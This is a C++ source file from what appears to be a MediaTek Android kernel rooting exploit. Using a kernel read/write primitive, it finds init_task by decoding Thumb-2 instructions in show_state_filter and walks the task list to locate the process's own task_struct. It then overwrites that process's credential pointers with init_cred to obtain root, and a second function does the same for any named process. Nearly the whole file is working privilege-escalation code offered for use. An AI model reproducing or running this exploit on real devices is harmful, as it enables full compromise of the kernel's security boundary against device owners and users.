#include <string.h>
#include <sys/prctl.h>
#include <time.h>
#include <unistd.h>

#include <iostream>
#include <memory>

#include "log.hpp"
#include "task.hpp"
#include "utils.hpp"

// The init_task's command name. This is from include/linux/init_task.h.
#define INIT_TASK_COMM "swapper"

// The max task command name size. This is from include/linux/sched.h.
#define TASK_COMM_LEN 16

// CMDQ writes physical memory without guaranteeing that a Cortex-A35 CPU will
// discard an already cached task_struct line.  Pre-allocate this buffer before
// the destructive write, then walk it afterwards to evict stale clean lines
// before the first UID syscall.  This never repeats the kernel write.
static constexpr size_t CRED_CACHE_EVICT_BYTES = 8 * 1024 * 1024;

static void _evict_stale_cred_cache(std::vector<uint8_t>& buffer)
{
	volatile uint8_t* bytes = buffer.data();
	for (uint32_t pass = 0; pass < 3; pass++) {
		for (size_t offset = 0; offset < buffer.size(); offset += 64) {
			bytes[offset] = static_cast<uint8_t>(bytes[offset] + pass + 1);
		}
	}
#if defined(__arm__) || defined(__aarch64__)
	asm volatile("dsb sy" ::: "memory");
#else
	__sync_synchronize();
#endif
}

// POD containing kernel addresses and offsets of interest. If an address is not resolved, it's set to zero.
typedef struct kernel_addrs {
	// Task struct address of the current process.
	uint64_t task_struct;

	// The address of the init_task, a.k.a. swapper process. This process is the first processes created, which is
	// why it's assigned PID zero. The kernel uses it as a default process to swap to when no other processes
	// are waiting execution. During execution, the init_task process just a busy loops unit another process
	// starts. This usually only occurs during boot time.
	//
	// The init_task is used to:
	// 1) Find a given process' task_task by traversing the tasks field
	// 2) Get a pointer to a cred struct of a root process (its own cred struct because it executes as root)
	uint64_t init_task;

	// Address of the init_task's cred struct, which contains root credentials. This value will be used to
	// overwrite the creds struct of the process to escalate, effectively giving it root credentials. This is a
	// safe cred struct to use because the init_task never exits.
	uint64_t init_cred;

	// The offset of the comm field within a task_struct, which varies depending on kernel build. This is used to:
	// 1) Identify the task_struct of the process to escalate
	// 2) Find the cred pointers that immediately precede this field
	uint32_t comm_offset;

	// The offset of the tasks field within a task_struct, which varies depending on kernel build. The tasks field
	// is a list_head struct which means it's actually pointing to the next task since it's the first field in the
	// struct. The previous task is one kernel pointer size away from the next offset.
	//
	// The next offset is used to iterate from one task struct (e.g. the init_task struct) to a task struct of
	// interest (usually the one that will be escalated).
	uint32_t next_offset;

	// The offset of the cred field within a task_struct.
	uint32_t cred_offset;

} kernel_addrs_t;

/**
 * Generates a random process name.
 *
 * @return a random 15 character process name
 */
static inline std::string _generate_random_process_name()
{
	// PR_SET_NAME is limited to 15 visible bytes. The old time-seeded random
	// value collided when boot auto-root and the Activity launched in the same
	// second, allowing one exploit process to select the other's task_struct.
	// A live PID is unique, and a recycled PID cannot still be in the task list.
	char process_name[TASK_COMM_LEN] = {};
	snprintf(process_name, sizeof(process_name), "x08c-%08x", (uint32_t)getpid());
	log_info("Renaming the current process to %s", process_name);
	return std::string(process_name);
}

/**
 * Determines if a given address is pointing to a task_struct.
 *
 * @param addr: The possible task_struct address.
 * @return true if addr is pointing to a task_struct, otherwise false
 */
static bool _is_task_struct(MTKSu& kern_rw, uint32_t addr, uint64_t comm_offset)
{
	auto task_struct_max_size = 0x800;
	auto task_struct_bytes = std::make_unique<std::vector<uint8_t>>();
	auto success = kern_rw.read(addr, task_struct_max_size, task_struct_bytes);
	if (!success) {
		log_error("Could not read task_struct bytes");
		return false;
	}

	// Must have a C string at offset
	char* comm = (char*)(((uint8_t*)task_struct_bytes->data()) + comm_offset);
	size_t comm_len = strnlen(comm, TASK_COMM_LEN);
	if (comm_len < 1 || comm_len >= TASK_COMM_LEN) {
		return false;
	}

	// The kernel stack pointer must be a kernel pointer
	const uint32_t kernel_stack_offset = get_kern_ptr_size();
	uint64_t kernel_stack = (uint64_t) * (uint32_t*)(((uint8_t*)task_struct_bytes->data()) + kernel_stack_offset);
	if (!is_vmalloc_address(kernel_stack)) {
		log_error("Not a task_struct because the kernel stack is not a kernel pointer: %" PRIx64, kernel_stack);
		return false;
	}

	return true;
}

/**
 * Finds the offset of the comm (command name) field in the task_struct.
 *
 * @param task_struct: The bytes of a task_struct struct.
 * @param task_struct_size: The number of bytes to search through in the task_struct.
 * @param command: The expected command name.
 * @param comm_offset: The offset of the comm field in the task_struct.
 * @return true if the comm field was found, otherwise false
 */
static bool _find_comm_offset_in_task_struct(uint8_t* task_struct,
                                             uint32_t task_struct_size,
                                             const char* command_name,
                                             uint32_t& comm_offset)
{
	const int str_eq = 0;

	// Increment by 4 because the comm field will be aligned
	uint32_t kern_ptr_size = get_kern_ptr_size();
	for (uint32_t str_itr = 0; str_itr + TASK_COMM_LEN <= task_struct_size; str_itr += kern_ptr_size) {
		char* str_val = (char*)(task_struct + str_itr);
		if (strncmp(str_val, command_name, TASK_COMM_LEN) == str_eq) {
			comm_offset = str_itr;
			return true;
		}
	}

	return false;
}

/**
 * Scans the show_state_filter function for a pointer to the init_task.
 *
 * @return true if found init_task, otherwise false
 */
static bool _find_init_task_via_show_state_filter(MTKSu& kern_rw,
                                                  std::map<std::string, uint64_t>& symbol_table,
                                                  kernel_addrs& addrs_out)
{
	const std::string show_state_filter_name = "Tshow_state_filter";
	auto show_state_filter_addr = 0ull;
	try {
		show_state_filter_addr = symbol_table.at(show_state_filter_name);
	} catch (std::out_of_range e) {
		log_error("Could not find show state filter function");
		return false;
	}
	log_info("Found show_state_filter at 0x%" PRIx64, show_state_filter_addr);

	uint64_t show_state_filter_end = show_state_filter_addr + 0x100;
	for (const auto& symbol : symbol_table) {
		if (symbol.second > show_state_filter_addr && symbol.second < show_state_filter_end) {
			show_state_filter_end = symbol.second;
		}
	}
	const uint32_t show_state_filter_size =
	    static_cast<uint32_t>(show_state_filter_end - show_state_filter_addr);
	if (show_state_filter_size < sizeof(uint32_t)) {
		log_error("show_state_filter has an invalid runtime size: %u", show_state_filter_size);
		return false;
	}
	log_info("Scanning show_state_filter runtime range 0x%" PRIx64 "-0x%" PRIx64,
	         show_state_filter_addr, show_state_filter_end);

	auto show_state_filter_func_bytes = std::make_unique<std::vector<uint8_t>>();
	auto success = kern_rw.read(show_state_filter_addr, show_state_filter_size, show_state_filter_func_bytes);
	if (!success) {
		log_error("Could not read show state filter function");
		return false;
	}

	uint16_t movw_low[16] = {};
	uint32_t movw_at[16] = {};
	bool have_movw[16] = {};
	auto task_struct_bytes = std::make_unique<std::vector<uint8_t>>();
	for (uint32_t offset = 0; offset + 4 <= show_state_filter_size; offset += 2) {
		uint16_t first_halfword = 0;
		uint16_t second_halfword = 0;
		get_value<uint16_t>(*show_state_filter_func_bytes, offset, first_halfword);
		get_value<uint16_t>(*show_state_filter_func_bytes, offset + 2, second_halfword);
		const uint32_t opcode = first_halfword & 0xfbf0;
		if (opcode != 0xf240 && opcode != 0xf2c0) {
			continue;
		}

		const uint32_t reg = (second_halfword >> 8) & 0xf;
		const uint16_t immediate = ((first_halfword & 0xf) << 12) |
		                           (((first_halfword >> 10) & 1) << 11) |
		                           (((second_halfword >> 12) & 7) << 8) |
		                           (second_halfword & 0xff);
		if (opcode == 0xf240) {
			movw_low[reg] = immediate;
			movw_at[reg] = offset;
			have_movw[reg] = true;
			continue;
		}
		if (!have_movw[reg] || offset - movw_at[reg] > 0x30) {
			continue;
		}

		const uint32_t candidate = (static_cast<uint32_t>(immediate) << 16) | movw_low[reg];
		if (!is_kernel_address(candidate)) {
			continue;
		}

		log_info("Decoded possible init_task 0x%x from show_state_filter+0x%x", candidate,
		         movw_at[reg]);

		const uint64_t task_struct_to_comm_max_size = 0x800;
		task_struct_bytes->clear();
		success = kern_rw.read(candidate, task_struct_to_comm_max_size, task_struct_bytes);
		if (!success) {
			continue;
		}

		success = _find_comm_offset_in_task_struct(task_struct_bytes->data(), task_struct_to_comm_max_size,
		                                           INIT_TASK_COMM "/0", addrs_out.comm_offset);
		if (!success) {
			log_info("Could not find task_struct->comm. Skipping 0x%x", candidate);
			continue;
		}
		if (!_is_task_struct(kern_rw, candidate, addrs_out.comm_offset)) {
			log_info("Candidate 0x%x failed task_struct validation", candidate);
			continue;
		}
		log_info("Found the task_struct->comm offset at 0x%" PRIx32, addrs_out.comm_offset);

		// Calculating the init_cred address. The creds fields are immediately before the comm field. This
		// is defined in kern/cred.c.
		success = get_kern_ptr(*task_struct_bytes.get(), addrs_out.comm_offset - get_kern_ptr_size(),
		                       addrs_out.init_cred);
		if (!success) {
			log_info("Could not get the task_struct pointer value");
			return false;
		}
		log_info("Found the init_cred addr at 0x%" PRIx64, addrs_out.init_cred);
		addrs_out.init_task = candidate;
		log_info("Found init_task at 0x%" PRIx64, addrs_out.init_task);
		return true;
	}

	return false;
}

static bool _find_next_task_offset(MTKSu& kern_rw,
                                   std::map<std::string, uint64_t>& symbol_table,
                                   uint64_t init_task_addr,
                                   uint32_t comm_offset,
                                   uint32_t& next_task_offset)
{
	const std::string show_state_filter_name = "Tshow_state_filter";
	auto show_state_filter_addr = 0ull;
	try {
		show_state_filter_addr = symbol_table.at(show_state_filter_name);
	} catch (std::out_of_range e) {
		log_error("Could not find show state filter function");
		return false;
	}

	uint64_t show_state_filter_end = show_state_filter_addr + 0x100;
	for (const auto& symbol : symbol_table) {
		if (symbol.second > show_state_filter_addr && symbol.second < show_state_filter_end) {
			show_state_filter_end = symbol.second;
		}
	}
	const uint32_t show_state_filter_size =
	    static_cast<uint32_t>(show_state_filter_end - show_state_filter_addr);
	auto show_state_filter_func_bytes = std::make_unique<std::vector<uint8_t>>();
	auto success = kern_rw.read(show_state_filter_addr, show_state_filter_size, show_state_filter_func_bytes);
	if (!success) {
		log_error("Could not read show state filter function");
		return false;
	}

	auto next_task_ptr_bytes = std::make_unique<std::vector<uint8_t>>();
	for (uint32_t offset = 0; offset + 4 <= show_state_filter_size; offset += 2) {
		uint16_t first_halfword = 0;
		uint16_t second_halfword = 0;
		get_value<uint16_t>(*show_state_filter_func_bytes, offset, first_halfword);
		get_value<uint16_t>(*show_state_filter_func_bytes, offset + 2, second_halfword);
		// Thumb-2 LDR.W Rt, [Rn, #imm12], with Rt == Rn, is the global task-list walk.
		if ((first_halfword & 0xfff0) != 0xf8d0) {
			continue;
		}
		const uint32_t base_reg = first_halfword & 0xf;
		const uint32_t dst_reg = (second_halfword >> 12) & 0xf;
		if (base_reg != dst_reg) {
			continue;
		}
		const uint32_t instr_immediate_offset = second_halfword & 0x0fff;
		const uint32_t next_offset_min = 0x200;
		const uint32_t next_offset_max = 0x600;
		if (instr_immediate_offset < next_offset_min || instr_immediate_offset > next_offset_max) {
			continue;
		}

		// Verify that the value at the offset is a kernel pointer
		next_task_ptr_bytes->clear();
		success =
		    kern_rw.read(init_task_addr + instr_immediate_offset, get_kern_ptr_size(), next_task_ptr_bytes);
		if (!success) {
			log_error("Could not read the next task pointer in the init_task");
			return false;
		}

		auto next_task_addr_ptr = 0ull;
		success = get_kern_ptr(*next_task_ptr_bytes.get(), 0, next_task_addr_ptr);
		if (!success) {
			log_error("Could not get the next task_struct pointer value");
			return false;
		}

		log_info("tasks offset 0x%x points to list_head 0x%" PRIx64, instr_immediate_offset,
		         next_task_addr_ptr);
		if (!is_vmalloc_address(next_task_addr_ptr) || next_task_addr_ptr < instr_immediate_offset) {
			continue;
		}
		const uint64_t next_task_addr = next_task_addr_ptr - instr_immediate_offset;
		log_info("Validating next task_struct candidate 0x%" PRIx64, next_task_addr);
		if (!_is_task_struct(kern_rw, next_task_addr, comm_offset)) {
			continue;
		}

		next_task_offset = instr_immediate_offset;
		log_info("Decoded task_struct->tasks.next offset: 0x%x", next_task_offset);
		return true;
	}

	return false;
}

static bool _find_init_task(MTKSu& kern_rw, std::map<std::string, uint64_t>& symbol_table, kernel_addrs& addrs_out)
{
	auto success = _find_init_task_via_show_state_filter(kern_rw, symbol_table, addrs_out);
	if (!success) {
		log_error("Failed to find the init_task via the show_state_filter scanning");
		return false;
	}

	return true;
}

/**
 * Iterate through the task_struct process list until a thread with a given command name is found.
 *
 * @param kern_rw: The kernel read/write used to access kernel memory.
 * @param task_struct_addr: The address of a given task_struct. This must be in the same namespace as the thread
 * we're looking for.
 * @param comm_offset: The offset of the comm field in a task_struct.
 * @param next_task_offset: The offset of the tasks.next field in a task_struct.
 * @param task_struct_out: The task_struct address of the thread with the comm field set to the comm_name parameter.
 * @return true if the task_struct was found, otherwise false
 */
static bool _find_task_by_exact_command_name(MTKSu& kern_rw,
                                             uint64_t task_struct_addr,
                                             uint32_t comm_offset,
                                             uint32_t next_task_offset,
                                             const std::string& command_name,
                                             uint64_t& task_struct_out)
{
	const uint64_t task_struct_buf_size = 0x800;
	auto task_struct_buf = std::make_unique<std::vector<uint8_t>>();
	uint64_t task_struct_itr = task_struct_addr;
	do {
		task_struct_buf->clear();
		auto success = kern_rw.read(task_struct_itr, task_struct_buf_size, task_struct_buf);
		if (!success) {
			log_error("Failed to read task_struct");
			return false;
		}

		char* comm_name_itr = (char*)(task_struct_buf->data() + comm_offset);
		log_info("%" PRIx64 " found task: %.*s", task_struct_itr, TASK_COMM_LEN, comm_name_itr);

		if (strncmp(comm_name_itr, command_name.c_str(), TASK_COMM_LEN) == 0) {
			log_info("Found the task_struct at %" PRIx64, task_struct_itr);
			task_struct_out = task_struct_itr;
			return true;
		}

		// The list_head next field points to the list_head field of the next task_struct. Calculate the
		// original task_struct address by subtracting the list_head offset.
		uint64_t next_task_list_head_addr =
		    (uint64_t) * (uint32_t*)(task_struct_buf->data() + next_task_offset);
		task_struct_itr = next_task_list_head_addr - next_task_offset;
		if (!is_vmalloc_address(task_struct_itr)) {
			log_error("task_struct is not a vmalloc address: %" PRIx64, task_struct_itr);
			return false;
		}

	} while (task_struct_itr != task_struct_addr);

	log_error("Looped through the entire task_struct list without finding the task_struct with the command name %s",
	          command_name.c_str());
	return false;
}

static bool _find_task_by_command_name(
    MTKSu& kern_rw, uint64_t task_struct_addr, uint32_t comm_offset, uint32_t next_task_offset, uint64_t& task_struct_out)
{
	auto process_name = _generate_random_process_name();
	const unsigned long ignored_param = 0;
	auto ret = prctl(PR_SET_NAME, process_name.c_str(), ignored_param, ignored_param, ignored_param, ignored_param);
	if (ret == -1) {
		log_error("Failed to set the process name to a unique name: %s", strerror(errno));
		return false;
	}

	return _find_task_by_exact_command_name(kern_rw, task_struct_addr, comm_offset, next_task_offset,
	                                        process_name, task_struct_out);
}

/**
 * Find the task_struct->tasks offset. These field with be two task_struct next to each other.
 */
static bool _find_task_struct_from_init_task(
    MTKSu& kern_rw, uint64_t init_task_addr, uint32_t comm_offset, uint32_t next_offset, uint64_t& task_struct_out)
{
	// Follow the two pointers, ensuring we don't loop all the way around. On each iteration, check if the
	// task_struct->comm matches the new randomly generated process name. If so, then we have found our
	// task_struct!
	auto success = _find_task_by_command_name(kern_rw, init_task_addr, comm_offset, next_offset, task_struct_out);
	if (!success) {
		log_error("Failed to find the task_struct by command name");
		return false;
	}

	return true;
}

static bool _find_task_struct(MTKSu& kern_rw, std::map<std::string, uint64_t>& symbol_table, kernel_addrs_t& addrs_out)
{
	log_info("Using the init_task method as a last resort to find the current task_struct");
	auto success = _find_init_task(kern_rw, symbol_table, addrs_out);
	if (!success) {
		log_error("Failed to find the init_task");
		return false;
	}

	success = _find_next_task_offset(kern_rw, symbol_table, addrs_out.init_task, addrs_out.comm_offset,
	                                 addrs_out.next_offset);
	if (!success) {
		log_error("Failed to find the init_task->tasks.next offset");
		return false;
	}

	success = _find_task_struct_from_init_task(kern_rw, addrs_out.init_task, addrs_out.comm_offset,
	                                           addrs_out.next_offset, addrs_out.task_struct);
	if (!success) {
		log_error("Found the init_task but could not find the task_struct");
		return false;
	}

	return true;
}

static inline bool _log_creds()
{
	uid_t ruid = 0, euid = 0, suid = 0;
	int ret = getresuid(&ruid, &euid, &suid);
	if (ret == -1) {
		log_error("getresuid failed: %s", strerror(errno));
		return false;
	}
	log_info("ruid: %d euid: %d suid: %d", ruid, euid, suid);
	return ruid == 0 && euid == 0 && suid == 0;
}

bool escalate_creds(MTKSu& kern_rw, std::map<std::string, uint64_t>& symbol_table)
{
	kernel_addrs_t addrs = {0};
	memset(&addrs, 0, sizeof(addrs));

	auto success = _find_task_struct(kern_rw, symbol_table, addrs);
	if (!success) {
		log_error("Failed to find the task_struct");
		return false;
	}
	// The cred field immediately precedes the comm field in the task_struct.
	addrs.cred_offset = addrs.comm_offset - get_kern_ptr_size();

	uint32_t write_buf[2] = {0};

	const uint64_t task_struct_buf_size = 0x800;
	auto task_struct_buf = std::make_unique<std::vector<uint8_t>>();

	success = kern_rw.read(addrs.task_struct, task_struct_buf_size, task_struct_buf);
	if (!success) {
		log_error("Failed to read task_struct");
		return false;
	}

	// Revalidate the exact task immediately before the destructive write. A
	// second queued exploit or task-list race must fail closed instead of
	// writing credentials into a stale/reused task_struct.
	char current_comm[TASK_COMM_LEN] = {};
	if (prctl(PR_GET_NAME, current_comm, 0, 0, 0) == -1 ||
	    strncmp(reinterpret_cast<char*>(task_struct_buf->data() + addrs.comm_offset),
	            current_comm, TASK_COMM_LEN) != 0) {
		log_error("Current task_struct identity changed before credential write");
		return false;
	}

	uint64_t old_real_cred = 0;
	uint64_t old_cred = 0;
	const uint32_t real_cred_offset = addrs.comm_offset - (2 * get_kern_ptr_size());
	const uint32_t cred_offset = addrs.comm_offset - get_kern_ptr_size();
	if (!get_kern_ptr(*task_struct_buf, real_cred_offset, old_real_cred) ||
	    !get_kern_ptr(*task_struct_buf, cred_offset, old_cred) ||
	    !is_vmalloc_address(old_real_cred) || !is_vmalloc_address(old_cred) ||
	    !is_vmalloc_address(addrs.init_cred)) {
		log_error("Credential pointer sanity check failed; refusing kernel write");
		return false;
	}
	log_info("Validated current task %s real_cred=0x%" PRIx64 " cred=0x%" PRIx64,
	         current_comm, old_real_cred, old_cred);

	std::vector<uint8_t> cache_evict;
	try {
		cache_evict.resize(CRED_CACHE_EVICT_BYTES, 0x5a);
	} catch (...) {
		log_error("Could not allocate the credential cache eviction buffer");
		return false;
	}

	_log_creds();

	uint64_t cred_addr = addrs.task_struct + addrs.cred_offset - get_kern_ptr_size();
	log_info("Overwriting creds at %" PRIx64 " with init_task's creds %" PRIx64, cred_addr, addrs.init_cred);

	write_buf[0] = addrs.init_cred;
	write_buf[1] = addrs.init_cred;
	auto write_buf_vec = std::vector<uint8_t>((uint8_t*)write_buf, ((uint8_t*)write_buf) + 8);
	auto write_buf_unique = std::make_unique<std::vector<uint8_t>>(write_buf_vec);
	success = kern_rw.write(cred_addr, write_buf_unique);
	if (!success) {
		log_error("Failed to overwrite the current thread's creds with init_task's creds");
		return false;
	}

	log_info("Successfully overwrote the current thread's creds with init_task's creds");
	auto verify_creds = std::make_unique<std::vector<uint8_t>>();
	if (!kern_rw.read(cred_addr, sizeof(write_buf), verify_creds)) {
		log_error("Failed to read back current task credential pointers");
		return false;
	}
	uint64_t verified_real_cred = 0;
	uint64_t verified_cred = 0;
	if (!get_kern_ptr(*verify_creds, 0, verified_real_cred) ||
	    !get_kern_ptr(*verify_creds, get_kern_ptr_size(), verified_cred) ||
	    verified_real_cred != addrs.init_cred || verified_cred != addrs.init_cred) {
		log_error("Current task credential pointer read-back failed; refusing to continue");
		return false;
	}
	log_info("Verified current task cred pointers both equal init_cred");
	log_info("Evicting stale CPU credential cache with an %zu-byte buffer", cache_evict.size());
	_evict_stale_cred_cache(cache_evict);
	if (!_log_creds()) {
		log_error("Cred pointers changed but CPU uid stayed unchanged after cache eviction; aborting without retry");
		return false;
	}
	log_info("Verified root credentials");
	task_struct_buf->clear();
	success = kern_rw.read(addrs.task_struct, task_struct_buf_size, task_struct_buf);
	if (!success) {
		log_error("Failed to read task_struct");
		return false;
	}

	return true;
}

bool escalate_task_by_command_name(MTKSu& kern_rw,
                                   std::map<std::string, uint64_t>& symbol_table,
                                   const std::string& command_name)
{
	if (command_name.empty() || command_name.size() >= TASK_COMM_LEN) {
		log_error("Invalid task command name for credential escalation");
		return false;
	}

	kernel_addrs_t addrs = {0};
	memset(&addrs, 0, sizeof(addrs));
	if (!_find_init_task(kern_rw, symbol_table, addrs)) {
		log_error("Failed to rediscover init_task while escalating %s", command_name.c_str());
		return false;
	}
	if (!_find_next_task_offset(kern_rw, symbol_table, addrs.init_task, addrs.comm_offset,
	                            addrs.next_offset)) {
		log_error("Failed to rediscover task list offset while escalating %s", command_name.c_str());
		return false;
	}
	if (!_find_task_by_exact_command_name(kern_rw, addrs.init_task, addrs.comm_offset,
	                                      addrs.next_offset, command_name, addrs.task_struct)) {
		log_error("Could not find the %s task_struct", command_name.c_str());
		return false;
	}

	const uint64_t cred_addr = addrs.task_struct + addrs.comm_offset - (2 * get_kern_ptr_size());
	uint32_t cred_ptrs[2] = {static_cast<uint32_t>(addrs.init_cred), static_cast<uint32_t>(addrs.init_cred)};
	auto write_buf = std::make_unique<std::vector<uint8_t>>(
	    reinterpret_cast<uint8_t*>(cred_ptrs), reinterpret_cast<uint8_t*>(cred_ptrs) + sizeof(cred_ptrs));
	log_info("Overwriting %s creds at 0x%" PRIx64 " with init_cred 0x%" PRIx64,
	         command_name.c_str(), cred_addr, addrs.init_cred);
	if (!kern_rw.write(cred_addr, write_buf)) {
		log_error("Failed to overwrite %s credentials", command_name.c_str());
		return false;
	}

	auto verify = std::make_unique<std::vector<uint8_t>>();
	if (!kern_rw.read(cred_addr, sizeof(cred_ptrs), verify)) {
		log_error("Failed to read back %s credentials", command_name.c_str());
		return false;
	}
	uint32_t real_cred = 0;
	uint32_t cred = 0;
	if (!get_value<uint32_t>(*verify, 0, real_cred) ||
	    !get_value<uint32_t>(*verify, get_kern_ptr_size(), cred) ||
	    real_cred != addrs.init_cred || cred != addrs.init_cred) {
		log_error("%s credential pointer verification failed", command_name.c_str());
		return false;
	}

	log_info("Verified %s now uses init_cred", command_name.c_str());
	return true;
}
